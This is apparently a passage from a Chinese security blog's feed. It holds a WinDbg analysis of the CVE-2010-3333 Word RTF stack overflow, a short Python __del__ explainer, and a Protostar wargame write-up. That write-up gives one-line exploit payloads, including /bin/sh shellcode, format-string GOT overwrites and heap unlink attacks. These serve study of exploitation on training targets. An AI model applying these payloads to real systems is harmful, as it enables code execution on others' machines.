class="number">0x9ed</span></div><div class="line"><span class="number">30d</span>a33f0  <span class="number">30d</span>20504 mso!Ordinal379+<span class="number">0x1e6</span></div><div class="line"><span class="number">30d</span>a33f4  <span class="number">30</span>ed4406 mso!Ordinal1246+<span class="number">0x168a</span></div><div class="line"><span class="number">30d</span>a33f8  <span class="number">30e652f</span>c mso!Ordinal3403+<span class="number">0x829</span></div><div class="line"><span class="number">30d</span>a33fc  <span class="number">30e83d</span>38 mso!Ordinal985+<span class="number">0x60e</span></div><div class="line"><span class="number">30d</span>a3400  <span class="number">312427f</span>c mso!Ordinal3247+<span class="number">0xc8</span></div><div class="line"><span class="number">30d</span>a3404  <span class="number">30e65344</span> mso!Ordinal3403+<span class="number">0x871</span></div><div class="line"><span class="number">30d</span>a3408  <span class="number">30e82</span>c90 mso!Ordinal1959+<span class="number">0x256</span></div><div class="line"><span class="number">30d</span>a340c  <span class="number">30f</span>b6964 mso!Ordinal1319+<span class="number">0x3a</span></div><div class="line"><span class="number">30d</span>a3410  <span class="number">31242814</span> mso!Ordinal3247+<span class="number">0xe0</span></div><div class="line"><span class="number">30d</span>a3414  <span class="number">30e7598</span>b mso!Ordinal1418+<span class="number">0x213c</span></div><div class="line"><span class="number">30d</span>a3418  <span class="number">30e75961</span> mso!Ordinal1418+<span class="number">0x2112</span></div><div class="line"><span class="number">30d</span>a341c  <span class="number">30f</span>392da mso!Ordinal3288+<span class="number">0x8c7</span></div><div class="line"><span class="number">30d</span>a3420  <span class="number">312428</span>c3 mso!Ordinal3247+<span class="number">0x18f</span></div><div class="line"><span class="number">30d</span>a3424  <span class="number">90909090</span></div><div class="line"><span class="number">30d</span>a3428  <span class="number">30d</span>a34a0 mso!Ordinal2841+<span class="number">0x82f</span>c</div><div class="line"><span class="number">30d</span>a342c  <span class="number">30d</span>a3558 mso!Ordinal2841+<span class="number">0x83b4</span></div><div class="line"><span class="number">30d</span>a3430  <span class="number">30d</span>a3620 mso!Ordinal2841+<span class="number">0x847c</span></div><div class="line"><span class="number">30d</span>a3434  <span class="number">30d</span>a37a0 mso!Ordinal2841+<span class="number">0x85f</span>c</div><div class="line"><span class="number">30d</span>a3438  <span class="number">30d</span>a3970 mso!Ordinal2841+<span class="number">0x87cc</span></div><div class="line"><span class="number">30d</span>a343c  <span class="number">30d</span>a3c80 mso!Ordinal2841+<span class="number">0x8ad</span>c</div><div class="line"><span class="number">30d</span>a3440  <span class="number">30d</span>a3f18 mso!Ordinal2841+<span class="number">0x8d</span>74</div><div class="line"><span class="number">30d</span>a3444  <span class="number">30d</span>a42c8 mso!Ordinal2841+<span class="number">0x9124</span></div><div class="line"><span class="number">30d</span>a3448  <span class="number">30d</span>a4650 mso!Ordinal2841+<span class="number">0x94ac</span></div><div class="line"><span class="number">30d</span>a344c  <span class="number">30d</span>a48a8 mso!Ordinal2841+<span class="number">0x9704</span></div><div class="line"><span class="number">30d</span>a3450  <span class="number">30d</span>a49b0 mso!Ordinal2841+<span class="number">0x980c</span></div><div class="line"><span class="number">30d</span>a3454  <span class="number">30d</span>a4b18 mso!Ordinal2841+<span class="number">0x9974</span></div></pre></td></tr></table></figure>
<p>此时eax是虚表指针，接着程序会调用<code>mso!Ordinal1246+0x168a</code>跟进去看看。</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; t</div><div class="line"><span class="built_in">eax</span>=00f11100 <span class="built_in">ebx</span>=<span class="number">05000000</span> <span class="built_in">ecx</span>=0000c8ac <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=1104000c <span class="built_in">edi</span>=00123e98</div><div class="line"><span class="built_in">eip</span>=30ed4427 <span class="built_in">esp</span>=00123e70 <span class="built_in">ebp</span>=00123ea8 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</div><div class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></div><div class="line">mso!Ordinal1246+<span class="number">0x16ab</span>:</div><div class="line">30ed4427 8bc1            <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">ecx</span></div><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; t</div><div class="line"><span class="built_in">eax</span>=0000c8ac <span class="built_in">ebx</span>=<span class="number">05000000</span> <span class="built_in">ecx</span>=0000c8ac <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=1104000c <span class="built_in">edi</span>=00123e98</div><div class="line"><span class="built_in">eip</span>=30ed4429 <span class="built_in">esp</span>=00123e70 <span class="built_in">ebp</span>=00123ea8 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</div><div class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></div><div class="line">mso!Ordinal1246+<span class="number">0x16ad</span>:</div><div class="line">30ed4429 c1e902          <span class="keyword">shr</span>     <span class="built_in">ecx</span>,<span class="number">2</span></div><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; t</div><div class="line"><span class="built_in">eax</span>=0000c8ac <span class="built_in">ebx</span>=<span class="number">05000000</span> <span class="built_in">ecx</span>=0000322b <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=1104000c <span class="built_in">edi</span>=00123e98</div><div class="line"><span class="built_in">eip</span>=30ed442c <span class="built_in">esp</span>=00123e70 <span class="built_in">ebp</span>=00123ea8 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</div><div class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></div><div class="line">mso!Ordinal1246+<span class="number">0x16b0</span>:</div><div class="line">30ed442c f3a5            <span class="keyword">rep</span> movs <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">edi</span>],<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>]</div></pre></td></tr></table></figure>
<p>拷贝大小为0xc8ac，因为是dword拷贝，所以拷贝<code>0xc8ac &gt;&gt; 2 = 0x322b</code>次。</p>
<p><img src="2.png" alt=""><br><img src="3.png" alt=""></p>
<p>可以看到ecx为长度，esi对应的内存为样本中的payload。</p>
<figure class="highlight dns"><table><tr><td class="code"><pre><div class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dd edi</div><div class="line"><span class="number">00123e98</span>  <span class="number">3</span>ff7ea<span class="number">64 05000000</span> <span class="number">00000000</span> <span class="number">80004006</span></div><div class="line"><span class="number">00123</span>ea8  <span class="number">00123</span>ed8 <span class="number">30</span>f0b56b <span class="number">00124014</span> <span class="number">00000000</span></div><div class="line"><span class="number">00123</span>eb8  ffffffff <span class="number">00000000</span> <span class="number">00f114f4</span> <span class="number">001244f8</span></div><div class="line"><span class="number">00123</span>ec8  <span class="number">00124164</span> <span class="number">00124f10</span> <span class="number">00124188</span> <span class="number">00000000</span></div><div class="line"><span class="number">00123</span>ed8  <span class="number">001240</span>bc <span class="number">30f0b4f9</span> <span class="number">00124060</span> <span class="number">00124014</span></div><div class="line"><span class="number">00123</span>ee8  <span class="number">00000000</span> <span class="number">00f114f4</span> <span class="number">00124164</span> <span class="number">001244f8</span></div><div class="line"><span class="number">00123</span>ef8  <span class="number">00000000</span> ffffffff ffffffff ffffffff</div><div class="line"><span class="number">00123f08</span>  <span class="number">00000000</span> <span class="number">20000000</span> <span class="number">00000101</span> <span class="number">00000000</span></div></pre></td></tr></table></figure>
<p>其中第二十字节<code>30f0b56b</code>为上层函数返回地址，所以21-24字节可以覆盖返回地址。不过栈上空间有DEP保护，无法执行代码。所以可以覆盖SEH来完成代码执行。</p>
<h2 id="patch-diff"><a href="#patch-diff" class="headerlink" title="patch diff"></a>patch diff</h2><p>使用bindiff看一下</p>
<p><img src="4.png" alt=""></p>
<p>发现这一坨应该就是处理越界长度的代码</p>
<p><img src="5.png" alt=""></p>
<p>eax为poc中pFragment的长度，可以看到如果大于4则跳转不进行复制。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;CVE-2010-3333漏洞是一个栈溢出漏洞，该漏洞是由于Microsoft word在处理RTF数据的对数据解析处理错误，可被利用破坏内存，导致任意代码执行。&lt;/p&gt;
    
    </summary>
    
      <category term="技术" scheme="http://weaponx.site/categories/tech/"/>
    
    
      <category term="安全" scheme="http://weaponx.site/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="漏洞分析" scheme="http://weaponx.site/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>评论系统切换至网易云跟帖</title>
    <link href="http://weaponx.site/2017/04/13/%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F%E5%88%87%E6%8D%A2%E8%87%B3%E7%BD%91%E6%98%93%E4%BA%91%E8%B7%9F%E5%B8%96/"/>
    <id>http://weaponx.site/2017/04/13/评论系统切换至网易云跟帖/</id>
    <published>2017-04-13T06:25:28.000Z</published>
    <updated>2017-04-13T06:28:36.157Z</updated>
    
    <content type="html"><![CDATA[<p>用了一阵多说，disqus。多说的问题在于经常大姨妈，而且即将关站。disqus被墙，对国内用户访问不友好。</p>
<p>对比了下友言和网易云跟帖，友言还需要备案号。当然最后选择的网易云跟帖。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;用了一阵多说，disqus。多说的问题在于经常大姨妈，而且即将关站。disqus被墙，对国内用户访问不友好。&lt;/p&gt;
&lt;p&gt;对比了下友言和网易云跟帖，友言还需要备案号。当然最后选择的网易云跟帖。&lt;/p&gt;

    
    </summary>
    
      <category term="生活" scheme="http://weaponx.site/categories/life/"/>
    
    
      <category term="博客" scheme="http://weaponx.site/tags/%E5%8D%9A%E5%AE%A2/"/>
    
  </entry>
  
  <entry>
    <title>python如何调用__del__及全局变量如何存储</title>
    <link href="http://weaponx.site/2017/04/12/python%E5%A6%82%E4%BD%95%E8%B0%83%E7%94%A8-del-%E5%8F%8A%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%A6%82%E4%BD%95%E5%AD%98%E5%82%A8/"/>
    <id>http://weaponx.site/2017/04/12/python如何调用-del-及全局变量如何存储/</id>
    <published>2017-04-13T02:05:28.000Z</published>
    <updated>2017-04-13T02:06:19.018Z</updated>
    
    <content type="html"><![CDATA[<p>在处理一个bug的时候发现程序一直报错，<code>Exception exceptions.NameError: &quot;global name &#39;TEST&#39; is not defined&quot;</code>。仔细审查了下源码，发现这个<code>TEST</code>变量是个全局变量，已经定义了。只不过在类的析构函数<code>__del__()</code>中解引用了<code>del TEST</code>。</p>
<p>这引出了两个问题：</p>
<ol>
<li>一个类的对象，什么时候调用析构函数？</li>
<li>为什么一个对象把<code>TEST</code>解引用了其他对象也无法访问？</li>
</ol>
<a id="more"></a>
<h2 id="Q1"><a href="#Q1" class="headerlink" title="Q1"></a>Q1</h2><p>在C/C++中，需要程序员自己完成垃圾回收。而在python中，是python自己完成垃圾回收工作的。在python中每个变量都有一个引用计数器来表示这个变量被引用的次数。当这个计数器为0的时候，python就会对这个变量进行垃圾回收（也就是调用类中的析构函数<code>__del__()</code>）。</p>
<p>下面有一个示例</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span><span class="params">()</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">print</span> <span class="string">"This is Init Function"</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__del__</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">print</span> <span class="string">"This is Del Function"</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">()</span>:</span></div><div class="line">    t = Test()</div><div class="line">    <span class="keyword">print</span> <span class="string">"Boom shakalaka"</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    <span class="keyword">print</span> <span class="string">"Before run test()"</span></div><div class="line">    test()</div><div class="line">    <span class="keyword">print</span> <span class="string">"After run test()"</span></div><div class="line"></div><div class="line">    <span class="keyword">print</span> <span class="string">"Before Create Object"</span></div><div class="line">    t1 = Test()</div><div class="line">    <span class="keyword">print</span> <span class="string">"After Create Object"</span></div></pre></td></tr></table></figure>
<p>我们看看执行后的结果</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">Before run <span class="built_in">test</span>()</div><div class="line">This is Init Function</div><div class="line">Boom shakalaka</div><div class="line">This is Del Function</div><div class="line">After run <span class="built_in">test</span>()</div><div class="line">Before Create Object</div><div class="line">This is Init Function</div><div class="line">After Create Object</div><div class="line">This is Del Function</div></pre></td></tr></table></figure>
<p>在执行<code>test()</code>函数的时候执行完成后，Test()的对象t被回收，调用析构函数<code>__del__</code>打印<code>This is Del Function</code>。</p>
<h2 id="Q2"><a href="#Q2" class="headerlink" title="Q2"></a>Q2</h2><p>在python中，全局变量使用共享内存的方式实现的。若一个对象解引用后，其他所有对象均无法访问。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span><span class="params">()</span>:</span></div><div class="line">    name = <span class="string">"test"</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__del__</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">del</span> Test.name</div><div class="line">        <span class="keyword">print</span> <span class="string">"This is Del Function"</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    t1 = Test()</div><div class="line">    t2 = Test()</div></pre></td></tr></table></figure>
<p>执行后会报错</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">This is Del Function</div><div class="line">Exception AttributeError: <span class="string">"'NoneType' object has no attribute 'name'"</span> <span class="keyword">in</span> &lt;bound method Test.__del__ of &lt;__main__.Test instance at 0x7f4dde73fd40&gt;&gt; ignored</div></pre></td></tr></table></figure>
<p>原因是在清除t1的时候对全局变量name解引用，导致t2调用析构函数时候访问异常。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在处理一个bug的时候发现程序一直报错，&lt;code&gt;Exception exceptions.NameError: &amp;quot;global name &amp;#39;TEST&amp;#39; is not defined&amp;quot;&lt;/code&gt;。仔细审查了下源码，发现这个&lt;code&gt;TEST&lt;/code&gt;变量是个全局变量，已经定义了。只不过在类的析构函数&lt;code&gt;__del__()&lt;/code&gt;中解引用了&lt;code&gt;del TEST&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;这引出了两个问题：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;一个类的对象，什么时候调用析构函数？&lt;/li&gt;
&lt;li&gt;为什么一个对象把&lt;code&gt;TEST&lt;/code&gt;解引用了其他对象也无法访问？&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="技术" scheme="http://weaponx.site/categories/tech/"/>
    
    
      <category term="python" scheme="http://weaponx.site/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Exploit-Exercises Protostar writeup PART I</title>
    <link href="http://weaponx.site/2017/04/11/Exploit-Exercises-Protostar-writeup-PART-I/"/>
    <id>http://weaponx.site/2017/04/11/Exploit-Exercises-Protostar-writeup-PART-I/</id>
    <published>2017-04-11T06:48:37.000Z</published>
    <updated>2017-04-11T06:51:42.437Z</updated>
    
    <content type="html"><![CDATA[<h2 id="stack0"><a href="#stack0" class="headerlink" title="stack0"></a>stack0</h2><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ python -c <span class="string">"print 0x44*'a'"</span> | ./stack0</div><div class="line">you have changed the <span class="string">'modified'</span> variable</div></pre></td></tr></table></figure>
<h2 id="stack1"><a href="#stack1" class="headerlink" title="stack1"></a>stack1</h2><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ python -c <span class="string">"print 0x40*'a'+'\x64\x63\x62\x61'"</span> | xargs ./stack1</div><div class="line">you have correctly got the variable to the right value</div></pre></td></tr></table></figure>
<h2 id="stack2"><a href="#stack2" class="headerlink" title="stack2"></a>stack2</h2><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">import</span> os</div><div class="line"></div><div class="line">payload = <span class="string">'a'</span>*<span class="number">0x40</span> + <span class="string">'\x0a\x0d\x0a\x0d'</span></div><div class="line">os.putenv(<span class="string">"GREENIE"</span>, payload)</div><div class="line">os.system(<span class="string">"./stack2"</span>)</div></pre></td></tr></table></figure>
<h2 id="stack3"><a href="#stack3" class="headerlink" title="stack3"></a>stack3</h2><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ readelf <span class="_">-a</span> stack3 | grep win</div><div class="line">There are no unwind sections <span class="keyword">in</span> this file.</div><div class="line">    56: 08048424    20 FUNC    GLOBAL DEFAULT   14 win</div><div class="line">$ python -c <span class="string">"print 0x40*'a'+'\x24\x84\x04\x08'"</span> | ./stack3</div><div class="line">calling <span class="keyword">function</span> pointer, jumping to 0x08048424</div><div class="line">code flow successfully changed</div></pre></td></tr></table></figure>
<h2 id="stack-4"><a href="#stack-4" class="headerlink" title="stack 4"></a>stack 4</h2><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">$ readelf <span class="_">-a</span> stack4 | grep win</div><div class="line">There are no unwind sections <span class="keyword">in</span> this file.</div><div class="line">    56: 080483f4    20 FUNC    GLOBAL DEFAULT   14 win</div><div class="line">$ python -c <span class="string">"print 76*'a'+'\xf4\x83\x04\x08'"</span>|./stack4</div><div class="line">code flow successfully changed</div></pre></td></tr></table></figure>
<h2 id="stack5"><a href="#stack5" class="headerlink" title="stack5"></a>stack5</h2><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">gdb-peda$ checksec</div><div class="line">CANARY    : disabled</div><div class="line">FORTIFY   : disabled</div><div class="line">NX        : disabled</div><div class="line">PIE       : disabled</div><div class="line">RELRO     : disabled</div></pre></td></tr></table></figure>
<p>系统没开ASLR。让程序崩溃，调试core dump获得stack address。<br><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">python -c <span class="string">"print 0x4c*'a'+'\x10\xfd\xff\xbf'+'\x31\xc9\xf7\xe1\xb0\x0b\xeb\x06\x5b\x51\x53\x5b\xcd\x80\xe8\xf5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'"</span> | ./stack5</div></pre></td></tr></table></figure></p>
<h2 id="stack6"><a href="#stack6" class="headerlink" title="stack6"></a>stack6</h2><p>return addr =&gt; addr(ret) =&gt; stack addr</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line"><span class="comment"># retn 0x08048508</span></div><div class="line">python -c <span class="string">"print 0x50*'a'+'\x08\x85\x04\x08'+'\x04\xfd\xff\xbf'+'\x31\xc9\xf7\xe1\xb0\x0b\xeb\x06\x5b\x51\x53\x5b\xcd\x80\xe8\xf5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'"</span> | ./stack6</div></pre></td></tr></table></figure>
<h2 id="stack7"><a href="#stack7" class="headerlink" title="stack7"></a>stack7</h2><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line"><span class="comment"># retn 0x08048553</span></div><div class="line">python -c <span class="string">"print 0x50*'a'+'\x53\x85\x04\x08'+'\x04\xfd\xff\xbf'+'\x31\xc9\xf7\xe1\xb0\x0b\xeb\x06\x5b\x51\x53\x5b\xcd\x80\xe8\xf5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'"</span> | ./stack6</div></pre></td></tr></table></figure>
<h2 id="format0"><a href="#format0" class="headerlink" title="format0"></a>format0</h2><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">root@protostar:/opt/protostar/bin<span class="comment"># python -c "print 0x40*'a'+'\xef\xbe\xad\xde'" | xargs ./format0</span></div><div class="line">you have hit the target correctly :)</div></pre></td></tr></table></figure>
<h2 id="format1"><a href="#format1" class="headerlink" title="format1"></a>format1</h2><p><code>%128$n</code>代表第128个参数，argv会放在栈上。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">root@protostar:/opt/protostar/bin<span class="comment"># python -c "print '\x38\x96\x04\x08\x08\x04aaa%128\$n'" | xargs ./format1                                                                       aaayou have modified the target :)</span></div></pre></td></tr></table></figure>
<h2 id="format2"><a href="#format2" class="headerlink" title="format2"></a>format2</h2><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   0x8048477 &lt;vuln+35&gt;: call   0x804835c &lt;fgets@plt&gt;</div><div class="line">   0x804847c &lt;vuln+40&gt;: lea    eax,[ebp-0x208]</div><div class="line">   0x8048482 &lt;vuln+46&gt;: mov    DWORD PTR [esp],eax</div><div class="line">=&gt; 0x8048485 &lt;vuln+49&gt;: call   0x804837c &lt;<span class="built_in">printf</span>@plt&gt;</div><div class="line">   0x804848a &lt;vuln+54&gt;: mov    eax,ds:0x80496e4</div><div class="line">   0x804848f &lt;vuln+59&gt;: cmp    eax,0x40</div><div class="line">   0x8048492 &lt;vuln+62&gt;: jne    0x80484a2 &lt;vuln+78&gt;</div><div class="line">   0x8048494 &lt;vuln+64&gt;: mov    DWORD PTR [esp],0x8048590</div><div class="line">Guessed arguments:</div><div class="line">arg[0]: 0xffffd450 (<span class="string">"aaaaaa\n"</span>)</div><div class="line">[------------------------------------stack-------------------------------------]</div><div class="line">0000| 0xffffd440 --&gt; 0xffffd450 (<span class="string">"aaaaaa\n"</span>)</div><div class="line">0004| 0xffffd444 --&gt; 0x200</div><div class="line">0008| 0xffffd448 --&gt; 0xf7<span class="built_in">fc</span>2c20 --&gt; 0xfbad2288</div><div class="line">0012| 0xffffd44c --&gt; 0xf7fec308 (&lt;_dl_check_map_versions+632&gt;:  mov    edi,eax)</div><div class="line">0016| 0xffffd450 (<span class="string">"aaaaaa\n"</span>)</div></pre></td></tr></table></figure>
<p>exploit:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">root@protostar:/opt/protostar/bin<span class="comment"># python -c "print '\xe4\x96\x04\x08%4\$060x%4\$n'" | ./format2</span></div><div class="line">.0000000000000000000000000000000000000000000000000000080496e4</div><div class="line">you have modified the target :)</div></pre></td></tr></table></figure>
<h2 id="format3"><a href="#format3" class="headerlink" title="format3"></a>format3</h2><figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">python -c <span class="string">"print '\xf4\x96\x04\x08%12\$016930112x%12\$n'"</span> | ./format3</div></pre></td></tr></table></figure>
<p>看了我的方法还是有点弱- -，基本就是一字节写比较好的方法</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">python -c <span class="string">'print "\xf4\x96\x04\x08"+"\xf5\x96\x04\x08"+"\xf6\x96\x04\x08"+"\xf7\x96\x04\x08"+"%52x%12$n%13$n%14$n%15$n"'</span> | ./format3</div><div class="line">target is 44444444 :(</div></pre></td></tr></table></figure>
<h2 id="format4"><a href="#format4" class="headerlink" title="format4"></a>format4</h2><p>写exit的GOT表中的数据,<code>GOT[&quot;exit&quot;]=0x08049724</code>，单字节写入。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">python -c <span class="string">"print '\x24\x97\x04\x08\x25\x97\x04\x08\x26\x97\x04\x08\x27\x97\x04\x08'+'%0164x%4\$n%0208x%5\$n%0128x%6\$n%260x%7\$n'"</span> | ./format4</div></pre></td></tr></table></figure>
<h2 id="heap0"><a href="#heap0" class="headerlink" title="heap0"></a>heap0</h2><p>winner = 0x08048464</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">root@protostar:/opt/protostar/bin<span class="comment"># python -c "print 72*'a'+'\x64\x84\x04\x08'" | xargs ./heap0</span></div><div class="line">data is at 0x804a008, fp is at 0x804a050</div><div class="line">level passed</div></pre></td></tr></table></figure>
<h2 id="heap1"><a href="#heap1" class="headerlink" title="heap1"></a>heap1</h2><p>GOT[“puts”] = 0x08049774<br>winner = 0x08048494<br>没啥说的，把第二个指针覆盖为puts的got地址，第二次strcpy把winner写入puts的got表中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">root@protostar:/opt/protostar/bin<span class="comment"># ./heap1 $(python -c "print 20 * 'a' + '\x74\x97\x04\x08'")  $(python -c "print '\x94\x84\x04\x08'")</span></div><div class="line">and we have a winner @ 1491862467</div></pre></td></tr></table></figure>
<h2 id="heap2"><a href="#heap2" class="headerlink" title="heap2"></a>heap2</h2><p>很明显的UAF，struct auth = 36字节，先创建auth，再free再用strdup分配36字节大小的空间即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">[ auth = (nil), service = (nil) ]</div><div class="line">auth aaaaa</div><div class="line">[ auth = 0x903d008, service = (nil) ]</div><div class="line">reset</div><div class="line">[ auth = 0x903d008, service = (nil) ]</div><div class="line">serviceaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</div><div class="line">[ auth = 0x903d008, service = 0x903d018 ]</div><div class="line">login</div><div class="line">you have logged <span class="keyword">in</span> already!</div><div class="line">[ auth = 0x903d008, service = 0x903d018 ]</div></pre></td></tr></table></figure>
<h2 id="heap3"><a href="#heap3" class="headerlink" title="heap3"></a>heap3</h2><p>unlink导致任意地址写</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">root@protostar:/opt/protostar/bin<span class="comment"># ./heap3 $(python -c 'print "A" * 4 + "\x68\x64\x88\x04\x08\xc3"') $(python -c 'print "A" * 32 + "\xf8\xff\xff\xff" + "\xfc\xff\xff\xff" + "A" * 8 + "\x1c\xb1\x04\x08" + "\x0c\xc0\x04\x08"') CCCC</span></div><div class="line">that wasn<span class="string">'t too bad now, was it? @ 1491865342</span></div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;stack0&quot;&gt;&lt;a href=&quot;#stack0&quot; class=&quot;headerlink&quot; title=&quot;stack0&quot;&gt;&lt;/a&gt;stack0&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code
    
    </summary>
    
      <category term="安全" scheme="http://weaponx.site/categories/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="pwn" scheme="http://weaponx.site/tags/pwn/"/>
    
      <category term="wargame" scheme="http://weaponx.site/tags/wargame/"/>
    
  </entry>
  
  <entry>
    <title>生成自己的Alphanumeric/Printable shellcode</title>
    <link href="http://weaponx.site/2017/04/07/%E7%94%9F%E6%88%90%E8%87%AA%E5%B7%B1%E7%9A%84Alphanumeric-Printable-shellcode/"/>
    <id>http://weaponx.site/2017/04/07/生成自己的Alphanumeric-Printable-shellcode/</id>
    <published>2017-04-07T08:40:22.000Z</published>
    <updated>2017-04-12T02:35:38.181Z</updated>
    
    <content type="html"><![CDATA[<p>文章已经发表到360播报:<a href="http://bobao.360.cn/learning/detail/3720.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3720.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;文章已经发表到360播报:&lt;a href=&quot;http://bobao.360.cn/learning/detail/3720.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://bobao.360.cn/learning/detail/3
    
    </summary>
    
      <category term="安全" scheme="http://weaponx.site/categories/%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="pwn" scheme="http://weaponx.site/tags/pwn/"/>
    
      <category term="wargame" scheme="http://weaponx.site/tags/wargame/"/>
    
  </entry>
  
  <entry>
    <title>unexploitable Writeup[pwnable.tw]</title>
    <link href="http://weaponx.site/2017/03/24/unexploitable-Writeup-pwnable-tw/"/>
    <id>http://weaponx.site/2017/03/24/unexploitable-Writeup-pwnable-tw/</id>
    <published>2017-03-24T08:34:20.000Z</published>
    <updated>2017-04-12T02:36:12.302Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-unexploitable"><a href="#0x00-unexploitable" class="headerlink" title="0x00 unexploitable"></a>0x00 unexploitable</h2><p>最近在刷pwnable.tw（类似pwnable.kr，不过是台湾的）的题，看到了一个unexploitable的题目。根据题目描述:</p>
<blockquote>
<p>The original challenge is on pwnable.kr and it is solvable.<br>This time we fix the vulnerability and now we promise that the service is unexploitable.</p>
</blockquote>
<p>下载下来后丢到ida看到确实没什么变化，除了pwnable.kr那个题中最重要的一点<code>syscall</code>没有给。</p>
